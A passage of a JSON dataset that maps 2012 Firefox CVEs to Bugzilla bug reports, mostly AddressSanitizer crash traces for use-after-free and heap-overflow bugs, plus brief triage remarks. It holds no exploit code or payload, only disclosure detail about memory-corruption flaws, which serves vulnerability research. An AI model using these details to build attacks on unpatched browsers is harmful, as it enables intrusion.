0x7f19de57a6ad in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #11 0x7f19dd519ce6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #12 0x7f19deb9db9a in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:209 #13 0x7f19deb9d9e3 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:202 #14 0x7f19deb9d8c8 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:176 #15 0x7f19dca23c8e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:165 #16 0x7f19db676eb8 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:257 #17 0x7f19d1e04d20 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3787 #18 0x7f19d1e0b6c2 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3864 #19 0x7f19d1e0eb92 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3940 #20 0x40c28f in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:160 #21 0x409cbd in main src/browser/app/nsBrowserApp.cpp:298 #22 0x7f19ee9c3c4d in ?? ??:0 ==2410== ABORTING Stats: 222M malloced (260M for red zones) by 614296 calls Stats: 50M realloced by 30116 calls Stats: 191M freed by 382570 calls Stats: 58M really freed by 173153 calls Stats: 464M (118841 full pages) mmaped in 116 calls mmaps by size class: 8:425958; 9:57337; 10:65520; 11:20470; 12:4096; 13:3072; 14:1536; 15:384; 16:640; 17:160; 18:224; 19:48; 20:12; mallocs by size class: 8:452010; 9:59723; 10:72170; 11:20208; 12:3653; 13:3340; 14:1706; 15:411; 16:629; 17:148; 18:238; 19:47; 20:13; frees by size class: 8:237578; 9:50565; 10:68846; 11:17073; 12:2672; 13:3053; 14:1487; 15:360; 16:531; 17:134; 18:218; 19:43; 20:10; rfrees by size class: 8:129647; 9:23124; 10:8778; 11:8941; 12:816; 13:545; 14:723; 15:159; 16:342; 17:52; 18:21; 19:4; 20:1; Stats: malloc large: 446 small slow: 2990 Shadow byte and word: 0x1fe335334250: fd 0x1fe335334250: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe335334230: fa fa fa fa fa fa fa fa 0x1fe335334238: fa fa fa fa fa fa fa fa 0x1fe335334240: fa fa fa fa fa fa fa fa 0x1fe335334248: fa fa fa fa fa fa fa fa =>0x1fe335334250: fd fd fd fd fd fd fd fd 0x1fe335334258: fd fd fd fd fd fd fd fd 0x1fe335334260: fd fd fd fd fd fd fd fd 0x1fe335334268: fd fd fd fd fd fd fd fd 0x1fe335334270: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-2806": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=759802",
        "title": "Null-pointer execution/null out of bounds write at libjpeg/jdmarker.c",
        "description": "Repro-file as attachment. Crash-report: https://crash-stats.mozilla.com/report/index/bp-7fbc775d-2fc4-46ff-9af8-b8a0f2120530 This issue seems to affect also Google Chrome and I have already reported it to Google. They have given me permission to report it also for Mozilla."
      }
    ],
    "CVE-2012-3105": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=744888",
        "title": "Work around NVIDIA driver bug in glBufferData",
        "description": "Thanks to Ken/Google for letting us know about this. My understanding of http://code.google.com/p/chromium/issues/detail?id=118970 is that the NVIDIA drivers have a bug: glBufferData with null data doesn't actually allocate the buffer until actual data is uploaded to it. This affects WebGL. We could work around this in 2 different places in WebGL (in WebGL bufferData and in the attrib 0 emulation code), but instead, I think that this is best handled at the level of GLContext."
      }
    ],
    "CVE-2012-3956": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=774597",
        "title": "Heap-use-after-free in MediaStreamGraphThreadRunnable::Run()",
        "description": "Reproduces on trunk, but no reliable testcase. Looks like a race condition, free and read stacks on different threads. ================================================================= ==23547== ERROR: AddressSanitizer heap-use-after-free on address 0x7f0a6bff8e98 at pc 0x7f0a97af44c9 bp 0x7f0a66fda690 sp 0x7f0a66fda688 READ of size 8 at 0x7f0a6bff8e98 thread T26 #0 0x7f0a97af44c9 in nsTArray_base<nsTArrayDefaultAllocator>::Length() const ../../dist/include/nsTArray.h:192 #1 0x7f0a97b000ba in mozilla::(anonymous namespace)::MediaStreamGraphThreadRunnable::Run() content/media/MediaStreamGraph.cpp:1418 #2 0x7f0a9901cc64 in NS_ProcessNextEvent_P(nsIThread*, bool) obj-firefox/xpcom/build/nsThreadUtils.cpp:217 #3 0x7f0a990de3ed in nsThread::ShuttingDown() xpcom/threads/nsThread.h:58 #4 0x7f0a9daf489f in _pt_root nsprpub/pr/src/pthreads/ptthread.c:159 #5 0x42795c in __asan::AsanThread::ThreadStart() 0x7f0a6bff8e98 is located 24 bytes inside of 160-byte region [0x7f0a6bff8e80,0x7f0a6bff8f20) freed by thread T0 here: #0 0x4248b2 in free #1 0x7f0a97b0019d in mozilla::(anonymous namespace)::MediaStreamGraphShutDownRunnable::Run() ../../dist/include/mozilla/mozalloc.h:224 #2 0x7f0a9901cc64 in NS_ProcessNextEvent_P(nsIThread*, bool) obj-firefox/xpcom/build/nsThreadUtils.cpp:217 #3 0x7f0a98d1b0d8 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #4 0x7f0a99164b9c in ~AutoRunState ipc/chromium/src/base/message_loop.cc:495 #5 0x7f0a98a49fce in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:165 #6 0x7f0a95f13410 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3864 #7 0x7f0a95f144ab in XRE_main toolkit/xre/nsAppRunner.cpp:3940 #8 0x408d26 in do_main(int, char**) browser/app/nsBrowserApp.cpp:160 #9 0x7f0a9e942c4d in __libc_start_main /build/buildd/eglibc-2.11.1/csu/libc-start.c:258 previously allocated by thread T0 here: #0 0x424972 in __interceptor_malloc #1 0x7f0a9be211a9 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 Thread T26 created by T0 here: #0 0x4204b5 in pthread_create #1 0x7f0a9daf08af in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:393 #2 0x7f0a9daf0308 in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:476 ==23547== ABORTING Stats: 224M malloced (246M for red zones) by 555057 calls Stats: 63M realloced by 26859 calls Stats: 192M freed by 304029 calls Stats: 56M really freed by 87570 calls Stats: 452M (115781 full pages) mmaped in 113 calls mmaps by size class: 8:409575; 9:57337; 10:20475; 11:14329; 12:5120; 13:3584; 14:1792; 15:384; 16:704; 17:128; 18:352; 19:48; 20:16; mallocs by size class: 8:448948; 9:58529; 10:19258; 11:15813; 12:5297; 13:3626; 14:1808; 15:460; 16:754; 17:148; 18:356; 19:46; 20:14; frees by size class: 8:221668; 9:43579; 10:15245; 11:12709; 12:4297; 13:3356; 14:1570; 15:403; 16:678; 17:129; 18:341; 19:42; 20:12; rfrees by size class: 8:59999; 9:12785; 10:4920; 11:6721; 12:899; 13:593; 14:1049; 15:151; 16:365; 17:44; 18:27; 19:16; 20:1; Stats: malloc large: 564 small slow: 2703 Shadow byte and word: 0x1fe14d7ff1d3: fd 0x1fe14d7ff1d0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe14d7ff1b0: fa fa fa fa fa fa fa fa 0x1fe14d7ff1b8: fa fa fa fa fa fa fa fa 0x1fe14d7ff1c0: fa fa fa fa fa fa fa fa 0x1fe14d7ff1c8: fa fa fa fa fa fa fa fa =>0x1fe14d7ff1d0: fd fd fd fd fd fd fd fd 0x1fe14d7ff1d8: fd fd fd fd fd fd fd fd 0x1fe14d7ff1e0: fd fd fd fd fd fd fd fd 0x1fe14d7ff1e8: fd fd fd fd fd fd fd fd 0x1fe14d7ff1f0: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-3957": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=774548",
        "title": "Heap-buffer-overflow in nsBlockFrame::MarkLineDirty",
        "description": "Reproduces on trunk. ================================================================= ==25348== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f07b3382ab4 at pc 0x7f07e1f45e62 bp 0x7fff73ddf550 sp 0x7fff73ddf548 READ of size 4 at 0x7f07b3382ab4 thread T0 #0 0x7f07e1f45e62 in nsLineBox::IsInline() const asn1cmn.c:0 #1 0x7f07e1f45647 in nsBlockFrame::MarkLineDirty(nsLineList_iterator, nsLineList const*) layout/generic/nsBlockFrame.cpp:1562 #2 0x7f07e1f82d34 in nsBlockFrame::AddFrames(nsFrameList&, nsIFrame*) layout/generic/nsBlockFrame.cpp:4990 #3 0x7f07e1f8089d in nsBlockFrame::InsertFrames(mozilla::layout::FrameChildListID, nsIFrame*, nsFrameList&) layout/generic/nsBlockFrame.cpp:4838 #4 0x7f07e1b38e92 in nsFrameManager::InsertFrames(nsIFrame*, mozilla::layout::FrameChildListID, nsIFrame*, nsFrameList&) layout/base/nsFrameManager.cpp:463 #5 0x7f07e18a76f0 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) layout/base/nsCSSFrameConstructor.cpp:7332 #6 0x7f07e18a06a9 in nsCSSFrameConstructor::ContentInserted(nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) layout/base/nsCSSFrameConstructor.cpp:6814 #7 0x7f07e1890a69 in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool) layout/base/nsCSSFrameConstructor.cpp:9263 #8 0x7f07e18c0772 in nsCSSFrameConstructor::ProcessRestyledFrames(nsStyleChangeList&) layout/base/nsCSSFrameConstructor.cpp:8008 #9 0x7f07e18c6afd in nsCSSFrameConstructor::RestyleElement(mozilla::dom::Element*, nsIFrame*, nsChangeHint, mozilla::css::RestyleTracker&, bool) layout/base/nsCSSFrameConstructor.cpp:8162 #10 0x7f07e181129d in mozilla::css::RestyleTracker::ProcessOneRestyle(mozilla::dom::Element*, nsRestyleHint, nsChangeHint) layout/base/RestyleTracker.cpp:125 #11 0x7f07e180b8d6 in mozilla::css::RestyleTracker::DoProcessRestyles() layout/base/RestyleTracker.cpp:210 #12 0x7f07e18ee7ba in mozilla::css::RestyleTracker::ProcessRestyles() layout/base/RestyleTracker.h:70 #13 0x7f07e18ee2ee in nsCSSFrameConstructor::ProcessPendingRestyles() layout/base/nsCSSFrameConstructor.cpp:11996 #14 0x7f07e1cc088e in PresShell::FlushPendingNotifications(mozFlushType) layout/base/nsPresShell.cpp:3814 #15 0x7f07e21a5d0c in nsGfxScrollFrameInner::AsyncScrollPortEvent::Run() layout/generic/nsGfxScrollFrame.cpp:2990 #16 0x7f07e1c4ea65 in nsRootPresContext::FlushWillPaintObservers() layout/base/nsPresContext.cpp:2807 #17 0x7f07e1c621b9 in nsRootPresContext::RunWillPaintObservers::Run() layout/base/nsPresContext.h:1381 #18 0x7f07ecd040dd in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:625 #19 0x7f07ec992e8d in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #20 0x7f07eb980ea6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #21 0x7f07ecfb80ba in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:209 #22 0x7f07ecfb7f03 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:202 #23 0x7f07ecfb7de8 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:176 #24 0x7f07eae9161e in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:165 #25 0x7f07e9ae0f78 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:257 #26 0x7f07e025e2a0 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3787 #27 0x7f07e0264c42 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3864 #28 0x7f07e0268112 in XRE_main toolkit/xre/nsAppRunner.cpp:3940 #29 0x40c28f in do_main(int, char**) browser/app/nsBrowserApp.cpp:160 #30 0x409cbd in main browser/app/nsBrowserApp.cpp:298 #31 0x7f07fcc21c4d in ?? ??:0 0x7f07b3382ab4 is located 20 bytes to the right of 32-byte region [0x7f07b3382a80,0x7f07b3382aa0) allocated by thread T0 here: #0 0x4a4452 in __interceptor_malloc ??:0 #1 0x7f07f9aad717 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 #2 0x7f07e1f66f4b in nsBlockFrame::PushLines(nsBlockReflowState&, nsLineList_iterator) layout/generic/nsBlockFrame.cpp:4414 #3 0x7f07e1f7630c in nsBlockFrame::PlaceLine(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFloatManager::SavedState*, nsRect&, int&, bool*) layout/generic/nsBlockFrame.cpp:4325 #4 0x7f07e1f6cb5e in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) layout/generic/nsBlockFrame.cpp:3764 #5 0x7f07e1f5d897 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:3482 #6 0x7f07e1f4c24c in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:2570 #7 0x7f07e1f316b1 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) layout/generic/nsBlockFrame.cpp:2020 #8 0x7f07e1f2514f in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsBlockFrame.cpp:1069 #9 0x7f07e2014c27 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) layout/generic/nsContainerFrame.cpp:906 #10 0x7f07e1ff6b35 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) layout/generic/nsColumnSetFrame.cpp:665 #11 0x7f07e1ffdcd7 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsColumnSetFrame.cpp:920 #12 0x7f07e1fb53bb in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) layout/generic/nsBlockReflowContext.cpp:262 #13 0x7f07e1f566b7 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:3206 #14 0x7f07e1f4bda6 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) layout/generic/nsBlockFrame.cpp:2514 #15 0x7f07e1f316b1 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) layout/generic/nsBlockFrame.cpp:2020 #16 0x7f07e1f2514f in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsBlockFrame.cpp:1069 #17 0x7f07e2014c27 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) layout/generic/nsContainerFrame.cpp:906 #18 0x7f07e1ff6b35 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) layout/generic/nsColumnSetFrame.cpp:665 #19 0x7f07e1ffdcd7 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsColumnSetFrame.cpp:920 #20 0x7f07e2014c27 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) layout/generic/nsContainerFrame.cpp:906 #21 0x7f07e21e5eb7 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) layout/generic/nsCanvasFrame.cpp:429 #22 0x7f07e2014c27 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) layout/generic/nsContainerFrame.cpp:906 #23 0x7f07e215f54e in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) layout/generic/nsGfxScrollFrame.cpp:518 #24 0x7f07e2159c72 in nsHTMLScrollFrame::TryLayout(ScrollReflowState*, nsHTMLReflowMetrics*, bool, bool, bool, unsigned int*) layout/generic/nsGfxScrollFrame.cpp:363 ==25348== ABORTING Stats: 152M malloced (168M for red zones) by 363291 calls Stats: 39M realloced by 19415 calls Stats: 109M freed by 231030 calls Stats: 0M really freed by 0 calls Stats: 344M (88112 full pages) mmaped in 86 calls mmaps by size class: 8:294894; 9:49146; 10:20475; 11:18423; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:128; 18:176; 19:40; 20:12; mallocs by size class: 8:274461; 9:47542; 10:16571; 11:17710; 12:2504; 13:1857; 14:1429; 15:321; 16:571; 17:101; 18:172; 19:40; 20:12; frees by size class: 8:162364; 9:36580; 10:13056; 11:14376; 12:1553; 13:942; 14:1230; 15:269; 16:470; 17:91; 18:52; 19:38; 20:9; rfrees by size class: Stats: malloc large: 325 small slow: 1903 Shadow byte and word: 0x1fe0f6670556: fb 0x1fe0f6670550: 00 00 00 00 fb fb fb fb More shadow bytes: 0x1fe0f6670530: fd fd fd fd fd fd fd fd 0x1fe0f6670538: fd fd fd fd fd fd fd fd 0x1fe0f6670540: fa fa fa fa fa fa fa fa 0x1fe0f6670548: fa fa fa fa fa fa fa fa =>0x1fe0f6670550: 00 00 00 00 fb fb fb fb 0x1fe0f6670558: fb fb fb fb fb fb fb fb 0x1fe0f6670560: fa fa fa fa fa fa fa fa 0x1fe0f6670568: fa fa fa fa fa fa fa fa 0x1fe0f6670570: 00 00 00 00 00 00 00 00"
      }
    ],
    "CVE-2012-3958": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=772346",
        "title": "Heap-use-after-free in nsHTMLEditRules::DeleteNonTableElements",
        "description": "Reproduces on trunk. My repro is ugly but reproduces reliably on my local machine. I will attach something here once i get a better minimized repro. I debugged and didnt see a reason to wait for filing. Some of the stack frames are missing b/w #0 and #1 since this is an optimized build. But GetPreviousSibling() in #0 [see nsHTMLEditRules::DeleteNonTableElements] tells that the stale child is being accessed. It looks like raw ptr issue probably coming from http://hg.mozilla.org/mozilla-central/diff/270ac87cffba/editor/libeditor/html/nsHTMLEditRules.cpp#l1.85. When i changed to nsCOMPtr and recompiled, crash stopped. ================================================================= ==19766== ERROR: AddressSanitizer heap-use-after-free on address 0x7fc1cdd689b8 at pc 0x7fc20556baa8 bp 0x7fff36485200 sp 0x7fff364851f8 READ of size 8 at 0x7fc1cdd689b8 thread T0 #0 0x7fc20556baa8 in nsINode::GetPreviousSibling() const firefox/src/modules/zlib/src/inffast.c:0 #1 0x7fc2062f5dc0 in nsHTMLEditRules::WillDoAction(mozilla::Selection*, nsRulesInfo*, bool*, bool*) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:577 #2 0x7fc20618d040 in nsPlaintextEditor::DeleteSelection(short, short) firefox/src/editor/libeditor/text/nsPlaintextEditor.cpp:657 #3 0x7fc2062f6468 in nsHTMLEditRules::WillInsertText(nsEditor::OperationID, mozilla::Selection*, bool*, bool*, nsAString_internal const*, nsAString_internal*, int) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:1260 #4 0x7fc2062f5ca3 in nsHTMLEditRules::WillDoAction(mozilla::Selection*, nsRulesInfo*, bool*, bool*) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:570 #5 0x7fc20618d5ec in nsPlaintextEditor::InsertText(nsAString_internal const&) firefox/src/editor/libeditor/text/nsPlaintextEditor.cpp:700 #6 0x7fc2061c3c67 in nsInsertPlaintextCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) firefox/src/editor/libeditor/base/nsEditorCommands.cpp:834 #7 0x7fc2069858a9 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) firefox/src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 #8 0x7fc20697ec11 in nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) firefox/src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:153 #9 0x7fc2069824f7 in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) firefox/src/embedding/components/commandhandler/src/nsCommandManager.cpp:238 #10 0x7fc205de5469 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) firefox/src/content/html/document/src/nsHTMLDocument.cpp:3218 #11 0x7fc20721b125 in NS_InvokeByIndex_P firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:164 #12 0x7fc2066bdce8 in CallMethodHelper::Invoke() firefox/src/js/xpconnect/src/XPCWrappedNative.cpp:3071 #13 0x7fc2066cbfee in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) firefox/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1474 #14 0x7fc207b2807f in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) firefox/src/js/src/jscntxtinlines.h:400 #15 0x7fc207b1de9e in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2465 #16 0x7fc207b09315 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:299 #17 0x7fc207b29467 in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:482 #18 0x7fc207b297f1 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:519 #19 0x7fc207a3a713 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5370 #20 0x7fc207a3a9d9 in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5407 #21 0x7fc205f23907 in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1466 #22 0x7fc205f7eece in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9519 #23 0x7fc205f6e285 in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9783 #24 0x7fc205f7e378 in nsGlobalWindow::TimerCallback(nsITimer*, void*) firefox/src/dom/base/nsGlobalWindow.cpp:10055 #25 0x7fc2071f9094 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:473 #26 0x7fc2071f95e6 in nsTimerEvent::Run() firefox/src/xpcom/threads/nsTimerImpl.cpp:559 #27 0x7fc2071ef654 in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:624 #28 0x7fc20716061d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:217 #29 0x7fc206f5fd48 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #30 0x7fc20726091f in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #31 0x7fc206d6f73e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #32 0x7fc205171943 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 #33 0x7fc205172272 in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3940 #34 0x409e93 in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #35 0x40957d in main firefox/src/browser/app/nsBrowserApp.cpp:330 #36 0x7fc20c9a2c4d in ?? ??:0 0x7fc1cdd689b8 is located 56 bytes inside of 120-byte region [0x7fc1cdd68980,0x7fc1cdd689f8) freed by thread T0 here: #0 0x425a42 in free ??:0 #1 0x7fc205b17a9b in nsNodeUtils::LastRelease(nsINode*) firefox/src/content/base/src/nsNodeUtils.cpp:252 #2 0x7fc205ad86df in nsGenericDOMDataNode::Release() firefox/src/content/base/src/nsGenericDOMDataNode.cpp:113 #3 0x7fc2063169ad in nsHTMLEditRules::DeleteNonTableElements(nsINode*) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:2824 #4 0x7fc2062f5dc0 in nsHTMLEditRules::WillDoAction(mozilla::Selection*, nsRulesInfo*, bool*, bool*) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:577 #5 0x7fc20618d040 in nsPlaintextEditor::DeleteSelection(short, short) firefox/src/editor/libeditor/text/nsPlaintextEditor.cpp:657 #6 0x7fc2062f6468 in nsHTMLEditRules::WillInsertText(nsEditor::OperationID, mozilla::Selection*, bool*, bool*, nsAString_internal const*, nsAString_internal*, int) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:1260 #7 0x7fc2062f5ca3 in nsHTMLEditRules::WillDoAction(mozilla::Selection*, nsRulesInfo*, bool*, bool*) firefox/src/editor/libeditor/html/nsHTMLEditRules.cpp:570 #8 0x7fc20618d5ec in nsPlaintextEditor::InsertText(nsAString_internal const&) firefox/src/editor/libeditor/text/nsPlaintextEditor.cpp:700 #9 0x7fc2061c3c67 in nsInsertPlaintextCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) firefox/src/editor/libeditor/base/nsEditorCommands.cpp:834 #10 0x7fc2069858a9 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) firefox/src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 #11 0x7fc20697ec11 in nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) firefox/src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:153 #12 0x7fc2069824f7 in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) firefox/src/embedding/components/commandhandler/src/nsCommandManager.cpp:238 #13 0x7fc205de5469 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) firefox/src/content/html/document/src/nsHTMLDocument.cpp:3218 #14 0x7fc20721b125 in NS_InvokeByIndex_P firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:164 #15 0x7fc2066bdce8 in CallMethodHelper::Invoke() firefox/src/js/xpconnect/src/XPCWrappedNative.cpp:3071 #16 0x7fc2066cbfee in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) firefox/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1474 #17 0x7fc207b2807f in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) firefox/src/js/src/jscntxtinlines.h:400 #18 0x7fc207b1de9e in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2465 #19 0x7fc207b09315 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:299 #20 0x7fc207b29467 in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:482 #21 0x7fc207b297f1 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:519 #22 0x7fc207a3a713 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5370 #23 0x7fc207a3a9d9 in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5407 #24 0x7fc205f23907 in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1466 #25 0x7fc205f7eece in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9519 #26 0x7fc205f6e285 in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9783 #27 0x7fc205f7e378 in nsGlobalWindow::TimerCallback(nsITimer*, 